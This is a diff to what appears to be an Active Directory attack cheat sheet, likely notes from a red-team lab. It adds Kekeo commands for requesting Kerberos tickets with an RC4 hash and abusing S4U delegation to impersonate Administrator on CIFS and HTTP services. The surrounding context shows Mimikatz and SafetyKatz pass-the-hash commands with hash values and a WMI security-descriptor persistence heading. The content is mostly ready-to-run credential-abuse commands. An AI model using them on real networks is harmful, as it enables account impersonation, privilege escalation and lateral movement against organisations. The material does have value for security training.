@@ -276,6 +276,12 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
 ```
+#### Kekeo 
+```powershell
+tgt::ask /user:account /domain:domIN /rc4:d5dc90d74c91df97906c2629744e87ed
+tgs::s4u /tgt:TGT_account@domain.kirbi /user:Administrator /service:CIFS/host
+AltService:tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain /service:cifs/host.domain|http/host.domain
+``` 
 ### ACL 
 #### SecurityDescriptor - WMI 
 Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.
